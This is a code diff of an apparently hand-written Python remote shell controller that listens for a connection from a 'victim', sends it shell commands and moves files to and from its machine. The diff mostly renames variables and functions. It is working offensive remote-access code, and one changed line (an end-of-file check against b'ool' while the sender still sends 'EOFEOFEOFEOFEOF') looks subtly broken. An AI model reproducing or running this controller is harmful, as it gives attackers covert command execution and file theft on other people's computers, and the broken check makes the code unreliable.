@@ -9,8 +9,8 @@ def send_commands(conn):
     """Function used to send shell commands; additional used commands: quit, download, upload
     """
 
-    client_response = conn.recv(4096)
-    print(client_response.decode("utf-8"))
+    victim_response = conn.recv(4096)
+    print(victim_response.decode("utf-8"))
     while True:
         try:
             cmd = input()
@@ -27,26 +27,26 @@ def send_commands(conn):
                 down_file = cmd[9:]
                 receive_file = True
 
-                client_response = conn.recv(1024)
-                if client_response.endswith(b"Requested file not found"):
+                victim_response = conn.recv(1024)
+                if victim_response.endswith(b"Requested file not found"):
                     print("Requested file not found on the client")
-                    client_response = conn.recv(4096)
-                    print(client_response.decode("utf-8"))
+                    victim_response = conn.recv(4096)
+                    print(victim_response.decode("utf-8"))
 
                 else:
                     with open(down_file, 'wb') as f:
                         while receive_file:
-                            if client_response.endswith(b"EOFEOFEOFEOFEOF"):
+                            if victim_response.endswith(b"ool"):
                                 print("Download completed")
-                                data = client_response[:-15]
+                                data = victim_response[:-15]
                                 f.write(data)
                                 f.close()
-                                client_response = conn.recv(4096)
-                                print(client_response.decode("utf-8"))
+                                victim_response = conn.recv(4096)
+                                print(victim_response.decode("utf-8"))
                                 receive_file = False
                             else:
-                                f.write(client_response)
-                                client_response = conn.recv(1024)
+                                f.write(victim_response)
+                                victim_response = conn.recv(1024)
             elif cmd[:6] == 'upload':
                 """In the case of the 'upload' command, send the added file to the victim
                 """
@@ -63,25 +63,26 @@ def send_commands(conn):
                                 f.close()
                                 time.sleep(0.3)
                                 conn.send(str.encode("EOFEOFEOFEOFEOF"))
-                                client_response = conn.recv(4096)
-                                print(client_response.decode("utf-8"))
+                                victim_response = conn.recv(4096)
+                                print(victim_response.decode("utf-8"))
                                 sending = False
                             else:
                                 conn.send(file_to_send)
                 except FileNotFoundError:
                     print("File not found")
-                    print(client_response.decode("utf-8"))
+                    print(victim_response.decode("utf-8"))
             elif len(str.encode(cmd)) > 0:
                 """In case of other shell commands, sent them to the victim and take the  answer
                 """
                 conn.send(str.encode(cmd))
-                client_response = conn.recv(4096)
-                print(client_response.decode("utf-8"))
+                victim_response = conn.recv(4096)
+                print(victim_response.decode("utf-8"))
             elif cmd == '':
-                """Otherwise, take the answer from the victim
+                """Otherwise, send "null" to victim and display the current path of the victim
                 """
-                client_response = conn.recv(10000000)
-                print(client_response.decode("utf-8"))
+                conn.send(str.encode("null"))
+                victim_response = conn.recv(4096)
+                print(victim_response.decode("utf-8"))
         except (ConnectionResetError, ConnectionAbortedError):
             print("Connection with host was lost")
             s.listen(1)
@@ -91,11 +92,7 @@ def send_commands(conn):
             send_commands(conn)
 
 
-# def graphic():
-# interface.gui()
-
-
-def socket_create():
+def create_socket():
     """Function used to create the connection with the victim and to manage commands"""
     try:
         global s
@@ -122,7 +119,7 @@ def main():
         host = input("Enter your local host IP > ")
         print("Set LHOST: %s" % host)
         port = 9999
-        socket_create()
+        create_socket()
     except (ValueError, OSError, OverflowError):
         print("You entered invalid data")
         main()
